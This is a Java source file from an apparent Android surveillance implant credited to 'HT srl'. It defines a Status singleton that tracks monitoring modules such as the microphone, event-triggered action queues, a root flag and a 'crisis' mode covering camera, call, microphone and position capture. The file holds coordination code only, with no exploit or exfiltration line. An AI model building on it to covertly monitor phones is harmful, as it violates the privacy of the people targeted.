/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.service;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.concurrent.ScheduledThreadPoolExecutor;

import android.content.Context;

import com.android.service.action.Action;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfModule;
import com.android.service.conf.ConfEvent;
import com.android.service.conf.Globals;
import com.android.service.event.BaseEvent;
import com.android.service.module.ModuleCrisis;
import com.android.service.util.Check;

// Singleton Class
/**
 * The Class Status.
 */
public class Status {
	private static final String TAG = "Status"; //$NON-NLS-1$

	/** The agents map. */
	private final HashMap<String, ConfModule> agentsMap;

	/** The events map. */
	private final HashMap<Integer, ConfEvent> eventsMap;

	/** The actions map. */
	private final HashMap<Integer, Action> actionsMap;

	Globals globals;

	/** The triggered actions. */
	ArrayList<?>[] triggeredActions = new ArrayList<?>[Action.NUM_QUEUE];

	/** The synced. */
	public boolean synced;

	/** The drift. */
	public int drift;

	/** The context. */
	private static Context context;

	Object lockCrisis = new Object();
	private boolean crisis = false;
	private boolean[] crisisType = new boolean[ModuleCrisis.SIZE];
	private boolean haveRoot;

	private final Object[] triggeredSemaphore = new Object[Action.NUM_QUEUE];

	public boolean uninstall;
	public boolean reload;

	/**
	 * Instantiates a new status.
	 */
	private Status() {
		agentsMap = new HashMap<String, ConfModule>();
		eventsMap = new HashMap<Integer, ConfEvent>();
		actionsMap = new HashMap<Integer, Action>();

		for (int i = 0; i < Action.NUM_QUEUE; i++) {
			triggeredSemaphore[i] = new Object();
			triggeredActions[i] = new ArrayList<Integer>();
		}
	}

	/** The singleton. */
	private volatile static Status singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static Status self() {
		if (singleton == null) {
			synchronized (Status.class) {
				if (singleton == null) {
					singleton = new Status();
				}
			}
		}

		return singleton;
	}

	/**
	 * Clean.
	 */
	public void clean() {
		agentsMap.clear();
		eventsMap.clear();
		actionsMap.clear();
		globals = null;
		uninstall = false;
		reload = false;
	}

	/**
	 * Gets the app context.
	 * 
	 * @return the app context
	 */
	public static Context getAppContext() {
		if (Cfg.DEBUG) {
			Check.requires(context != null, "Null Context"); //$NON-NLS-1$
		}
		return context;
	}

	/**
	 * Sets the app context.
	 * 
	 * @param context
	 *            the new app context
	 */
	public static void setAppContext(final Context context) {
		if (Cfg.DEBUG) {
			Check.requires(context != null, "Null Context"); //$NON-NLS-1$
		}
		Status.context = context;
	}

	// Add an agent to the map
	/**
	 * Adds the agent.
	 * 
	 * @param a
	 *            the a
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public void addAgent(final ConfModule a) throws GeneralException {

		if (agentsMap.containsKey(a.getType()) == true) {
			// throw new RCSException("Agent " + a.getId() + " already loaded");
			if (Cfg.DEBUG) {
				Check.log(TAG + " Warn: " + "Substituing agent: " + a); //$NON-NLS-1$ //$NON-NLS-2$
			}
		}

		final String key = a.getType();
		if (Cfg.DEBUG) {
			Check.asserts(key != null, "null key"); //$NON-NLS-1$
		}

		agentsMap.put(a.getType(), a);
	}

	// Add an event to the map
	/**
	 * Adds the event.
	 * 
	 * @param e
	 *            the e
	 * @return
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public boolean addEvent(final ConfEvent e) {
		if (Cfg.DEBUG) {
			//Check.log(TAG + " addEvent "); //$NON-NLS-1$
		}
		// Don't add the same event twice
		if (eventsMap.containsKey(e.getId()) == true) {
			// throw new RCSException("Event " + e.getId() + " already loaded");
			if (Cfg.DEBUG) {
				Check.log(TAG + " Warn: " + "Substituing event: " + e); //$NON-NLS-1$ //$NON-NLS-2$
			}
		}

		eventsMap.put(e.getId(), e);
		return true;
	}

	// Add an action to the map
	/**
	 * Adds the action.
	 * 
	 * @param a
	 *            the a
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public void addAction(final Action a) {
		// Don't add the same action twice
		if (Cfg.DEBUG) {
			Check.requires(!actionsMap.containsKey(a.getId()), "Action " + a.getId() + " already loaded"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		actionsMap.put(a.getId(), a);
	}

	public void setGlobal(Globals g) {
		this.globals = g;
	}

	/**
	 * Gets the actions number.
	 * 
	 * @return the actions number
	 */
	public int getActionsNumber() {
		return actionsMap.size();
	}

	/**
	 * Gets the agents number.
	 * 
	 * @return the agents number
	 */
	public int getAgentsNumber() {
		return agentsMap.size();
	}

	/**
	 * Gets the events number.
	 * 
	 * @return the events number
	 */
	public int getEventsNumber() {
		return eventsMap.size();
	}

	/**
	 * Gets the agents map.
	 * 
	 * @return the agents map
	 */
	public HashMap<String, ConfModule> getAgentsMap() {
		return agentsMap;
	}

	/**
	 * Gets the events map.
	 * 
	 * @return the events map
	 */
	public HashMap<Integer, ConfEvent> getEventsMap() {
		return eventsMap;
	}

	/**
	 * Gets the actions map.
	 * 
	 * @return the actions map
	 */
	public HashMap<Integer, Action> getActionsMap() {
		return actionsMap;
	}

	/**
	 * Gets the action.
	 * 
	 * @param index
	 *            the index
	 * @return the action
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public Action getAction(final int index) throws GeneralException {
		if (actionsMap.containsKey(index) == false) {
			throw new GeneralException("Action " + index + " not found"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		final Action a = actionsMap.get(index);

		if (a == null) {
			throw new GeneralException("Action " + index + " is null"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		return a;
	}

	/**
	 * Gets the agent.
	 * 
	 * @param string
	 *            the id
	 * @return the agent
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public ConfModule getAgent(final String string) throws GeneralException {
		if (agentsMap.containsKey(string) == false) {
			throw new GeneralException("Agent " + string + " not found"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		final ConfModule a = agentsMap.get(string);

		if (a == null) {
			throw new GeneralException("Agent " + string + " is null"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		return a;
	}

	/**
	 * Gets the event.
	 * 
	 * @param id
	 *            the id
	 * @return the event
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public ConfEvent getEvent(final int id) throws GeneralException {
		if (eventsMap.containsKey(id) == false) {
			throw new GeneralException("Event " + id + " not found"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		final ConfEvent e = eventsMap.get(id);

		if (e == null) {
			throw new GeneralException("Event " + id + " is null"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		return e;
	}

	/**
	 * Gets the option.
	 * 
	 * @param id
	 *            the id
	 * @return the option
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public Globals getGlobals() {
		return globals;
	}

	/**
	 * Trigger action.
	 * 
	 * @param i
	 *            the i
	 * @param baseEvent
	 */
	public void triggerAction(final int i, BaseEvent baseEvent) {
		if (Cfg.DEBUG) {
			Check.requires(actionsMap != null, " (triggerAction) Assert failed, null actionsMap");
		}
		Action action = actionsMap.get(new Integer(i));
		if (Cfg.DEBUG) {
			Check.asserts(action != null, " (triggerAction) Assert failed, null action");
		}
		int qq = action.getQueue();
		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
		Object tsem = triggeredSemaphore[qq];

		if (Cfg.DEBUG)
			Check.asserts(act != null, "triggerAction, null act");
		if (Cfg.DEBUG)
			Check.asserts(tsem != null, "triggerAction, null tsem");

		Trigger trigger = new Trigger(i, baseEvent);
		synchronized (act) {
			if (!act.contains(trigger)) {
				act.add(new Trigger(i, baseEvent));
			}
		}
		
		if (Cfg.DEBUG) {
			Check.log(TAG + " (triggerAction): notifing queue: " + qq);
		}
		synchronized (tsem) {
			try {
				tsem.notifyAll();
			} catch (final Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(ex);//$NON-NLS-1$
				}
			}
		}
	}

	/**
	 * Gets the triggered actions.
	 * 
	 * @return the triggered actions
	 */
	public Trigger[] getTriggeredActions(int qq) {
		if (Cfg.DEBUG)
			Check.asserts(qq >= 0 && qq < Action.NUM_QUEUE, "getTriggeredActions qq: " + qq);

		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
		Object tsem = triggeredSemaphore[qq];

		if (Cfg.DEBUG)
			Check.asserts(tsem != null, "getTriggeredActions null tsem");

		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getTriggeredActions): waiting on sem: " + qq);
			}
			synchronized (tsem) {
				if(act.size()==0){
					tsem.wait();
				}else{
					if (Cfg.DEBUG) {
						Check.log(TAG + " (getTriggeredActions): have act not empty, don't wait");
					}
				}
			}
		} catch (final Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + " getActionIdTriggered: " + e); //$NON-NLS-1$ //$NON-NLS-2$
			}
		}

		synchronized (tsem) {
			final int size = act.size();
			final Trigger[] triggered = new Trigger[size];

			for (int i = 0; i < size; i++) {
				triggered[i] = act.get(i);
			}

			return triggered;
		}
	}

	/**
	 * Dangerous, DO NOT USE
	 * 
	 * @param qq
	 * @return
	 */
	@Deprecated
	public Trigger[] getNonBlockingTriggeredActions(int qq) {

		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
		final int size = act.size();
		final Trigger[] triggered = new Trigger[size];

		for (int i = 0; i < size; i++) {
			triggered[i] = act.get(i);
		}

		return triggered;
	}

	/**
	 * Un trigger action.
	 * 
	 * @param action
	 *            the action
	 */
	public void unTriggerAction(final Action action) {
		int qq = action.getQueue();
		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
		Object sem = triggeredSemaphore[qq];

		Trigger trigger = new Trigger(action.getId(), null);
		synchronized (act) {
			if (act.contains(trigger)) {
				act.remove(trigger);
			}
		}
		synchronized (sem) {
			try {
				sem.notifyAll();
			} catch (final Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(ex);//$NON-NLS-1$
				}
			}
		}
	}

	/**
	 * Un trigger all.
	 */
	public void unTriggerAll() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (unTriggerAll)"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		for (int qq = 0; qq < Action.NUM_QUEUE; qq++) {
			ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
			Object sem = triggeredSemaphore[qq];

			synchronized (act) {
				act.clear();
			}
			synchronized (sem) {
				try {
					sem.notifyAll();
				} catch (final Exception ex) {
					if (Cfg.DEBUG) {
						Check.log(ex);//$NON-NLS-1$
					}
				}
			}
		}

	}

	public synchronized void setCrisis(int type, boolean value) {
		synchronized (lockCrisis) {
			crisisType[type] = value;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " setCrisis: " + type); //$NON-NLS-1$
		}

		ConfModule agent;
		try {
			agent = getAgent("mic");
			if (agent != null) {
				// TODO: micAgent, crisis should stop recording
				// final AgentMic micAgent = (AgentMic) agent;
				// micAgent.crisis(crisisMic());
			}
		} catch (final GeneralException e) {
			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		}

	}

	private boolean isCrisis() {
		synchronized (lockCrisis) {
			return crisis;
		}
	}

	public boolean crisisPosition() {
		synchronized (lockCrisis) {
			return (isCrisis() && crisisType[ModuleCrisis.POSITION]);
		}
	}

	public boolean crisisCamera() {
		synchronized (lockCrisis) {
			return (isCrisis() && crisisType[ModuleCrisis.CAMERA]);
		}
	}

	public boolean crisisCall() {
		synchronized (lockCrisis) {
			return (isCrisis() && crisisType[ModuleCrisis.CALL]);
		}
	}

	public boolean crisisMic() {
		synchronized (lockCrisis) {
			return (isCrisis() && crisisType[ModuleCrisis.MIC]);
		}
	}

	public boolean crisisSync() {
		synchronized (lockCrisis) {
			return (isCrisis() && crisisType[ModuleCrisis.SYNC]);
		}
	}

	/**
	 * Start crisis.
	 */
	public void startCrisis() {
		synchronized (lockCrisis) {
			crisis = true;
		}
	}

	/**
	 * Stop crisis.
	 */
	public void stopCrisis() {
		synchronized (lockCrisis) {
			crisis = false;
		}
	}

	public boolean haveRoot() {
		return this.haveRoot;
	}

	public void setRoot(boolean r) {
		this.haveRoot = r;
	}

	ScheduledThreadPoolExecutor stpe = new ScheduledThreadPoolExecutor(10);

	public ScheduledThreadPoolExecutor getStpe() {
		return stpe;
	}

}
